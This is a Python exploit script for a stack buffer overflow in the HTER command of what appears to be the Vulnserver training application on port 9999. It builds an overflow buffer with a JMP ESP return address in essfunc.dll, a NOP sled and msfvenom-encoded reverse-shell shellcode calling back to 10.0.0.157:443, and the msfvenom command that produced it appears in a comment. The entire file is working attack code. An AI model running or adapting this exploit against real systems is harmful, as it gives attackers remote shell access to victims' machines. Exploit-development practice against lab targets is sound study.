#!/usr/bin/python3

import socket

# Egg is H@CK, egghunter is 32 bytes total
# egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x48\x40\x43\x4b\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

host = "10.0.0.192"
port = 9999

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=10.0.0.157 LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -i 3 -b "\x00" -f hex

shellcode = b"bff3b4b519dad8d97424f45d29c9b15f317d14037d1483edfc11416cd00cdeab1716219b719905d0b4d4e227040c908b8e33d51d6df82f7057b9e21910584685a1944fa3aff276bf2a4b082bbf56475dd155cdb0cdc0dcdde9227be078d68edafe84d5503904b1228ac52b687d38e4bcce1040b56b9731ba5da2365422a79f615e0ea76dbb14d3c13f7c9385423945b80ab438987e4982f4116bb74329d0c7783c1f2b3b82d9f20103586b8334ad96654f7e6a1edb83eccb995f119da032adf9cb19d0b6d0de9d0bc7f190f0ca2be7a433086e6b93e946c95aad2a397c2420e0067fc70682641433e56c0d75d4b9f065aff8211381695ac922cca5826529f912492084ebb48b75a72759b52de3975f2b5ab51935ca8b210481dfff7e69366c7b45e8ec97944ebce69c215c51e26b65100c18a060c69e49995c03262d1346cd2e6a4d4324c206ea7087815774e95f5ce3576c351158b66c3ccefdbcd4a331a2d1331c86994e825950a0b56d270fc82ee20140184e3a62b9c0d13acf368fc5a3fb6f78b5f1288d60c2264907128c438dbe66b3713f63"

buffer = b"A" * 2041
buffer += b"c7115062" # 0x625011c7 - JMP ESP in essfunc.dll
buffer += b"90" * 100 # ESP is located immediately after EIP at time of crash, so I include some NOPs to separate them because I have plenty of buffer space.
buffer += shellcode
buffer += b"90" * (3000 - len(buffer))

# Connect to target

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
banner = s.recv(1024)
print(banner.decode())

# Craft the exploit packet

exploit = "HTER ".encode() + bytearray(buffer) + "\r\n".encode()

# Send the exploit

s.send(exploit)
response = s.recv(1024)
print(response.decode())
s.close()
